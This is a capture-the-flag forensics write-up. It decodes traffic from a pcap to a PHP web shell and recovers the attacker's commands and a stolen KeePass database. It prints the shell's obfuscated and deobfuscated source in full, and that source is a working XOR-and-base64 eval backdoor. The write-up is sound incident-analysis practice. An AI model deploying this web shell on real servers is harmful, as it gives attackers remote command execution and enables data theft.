# Obscure
> Write-up author: vreshco
## DESCRIPTION:
An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. 
Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). 
We monitor our network 24/7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), 
however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.
## HINT:
- NONE
## STEPS:
1. Given 3 files, a .pcap file, .php, and a .txt.

> txt

![image](https://user-images.githubusercontent.com/70703371/232369346-54d9b6cd-b188-444b-9b71-0324696bac8d.png)


2. Inside the .txt file is the same as the description, let's check the .php file then.

> php

```php
<?php
$V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($';
$P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents(';
$d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i';
$B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}';
$N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion');
$c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@';
$u=str_replace('u)','',$V.$d.$P.$c.$B);
$x=$N('',$u);$x();
?>
```

3. To deobfuscate it, we can use [this](https://www.unphp.net/decode/365587cf53459685fac9e018b609a175/) online tool.

> Deobfuscated

```php
<?php function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0;$i < $l;) {
        for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0;$i < $l;) {
        for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    eval(@gzuncompress(@x(base64_decode($m[1]), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print ("$p$kh$r$kf");
}
```

4. Not a pro in php, but based from this if statement:

![image](https://user-images.githubusercontent.com/70703371/232371190-db69277f-d5f7-4832-91a6-6e2e35c3c76b.png)


5. We know the encoded "string" is between -> 0UlYyJHG87EJqEz66f8af44abea0 [encoded_string] 351039f4a7b5.
6. Feels there's nothing more useful in the script, let's digging the pcap file.

> WIRESHARK

![image](https://user-images.githubusercontent.com/70703371/232371856-8e4bee20-7c6f-4081-92a7-c5b22b9b41d6.png)
 
 
 7. Following the TCP stream we found 1 strings that holds the pattern we found at the php script.

![image](https://user-images.githubusercontent.com/70703371/232372271-eb965890-ecf0-445f-9ad5-7046f7e2b037.png)


8. The encoded strings must be -> `QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy`.
9. Following the TCP stream at 23rd we found similiar pattern.

![image](https://user-images.githubusercontent.com/70703371/232372751-b7c5bb09-5eb8-4aed-9dd3-600c9658b145.png)


10. Let's decode the first one by reversing the deobfuscated script we got before.

> Reversed

```html
<!DOCTYPE html>
<html>
<body>
<?php

$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0;$i < $l;) {
        for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}

/*
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    eval(@gzuncompress(@x(base64_decode($m[1]), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print ("$p$kh$r$kf");
}

?>
*/

$encoded_strings = "QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy"; // encoded strings goes here
$decode_base64 = base64_decode($encoded_strings);
$get_xor = x($decode_base64, $k);
$get_plaintext = gzuncompress($get_xor);
echo "Plaintext -> ".$get_plaintext;

?>

</body>
</html>
```

11. I don't use XAMPP or POSTMAN to run this, simply use [this](https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler) online PHP compiler.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/232377924-bb7e7ff5-0d6f-414a-bfca-3a2d306d14bb.png)


12. Great! We successfully decode the encoded strings and looks like the attacker execute `id`.
13. Let's decode the other strings we got.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/232378278-810c1aa2-e7a2-4333-848b-a3e43bdec473.png)


14. Looks like this time the attacker run `ls -lh`.
15. Notice there's 1 filename that could be our interest -> `pwdb.kdbx`.
16. Following the TCP stream at 24, we found similiar pattern again.

![image](https://user-images.githubusercontent.com/70703371/232378724-16b90f97-38d6-484c-ab26-11ed0f05eaa9.png)


> DECODE IT

![image](https://user-images.githubusercontent.com/70703371/232378884-e7c7af1b-3ca7-47bd-bc4b-56198d88aa46.png)


17. This time the attacker runs `pwd`, nothing interesting here.
18. Following the TCP stream at 25, we found the same pattern again, but longer.

![image](https://user-images.githubusercontent.com/70703371/232379002-d6f0c32c-187d-4ecd-9509-754316fa46eb.png)


> DECODE IT

![image](https://user-images.githubusercontent.com/70703371/232379081-f65e87fa-1143-43d2-89d2-651060f9db68.png)


19. Confused what it is, well it's the last stream we can follow, hence our approach must be from this last one.
20. Maybe the attacker cat the `kdbx` file (?)
21. Let's assume that for now, save the decoded strings into a file with .kdbx as the extension.
22. Now open the file using **KeePass**.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/232380024-862c0aed-97a1-4a35-96e0-fe2a7f278412.png)


23. It's asking for the master keys, which are good news because it really is a kdbx file.
24. But we need to find the master keys.






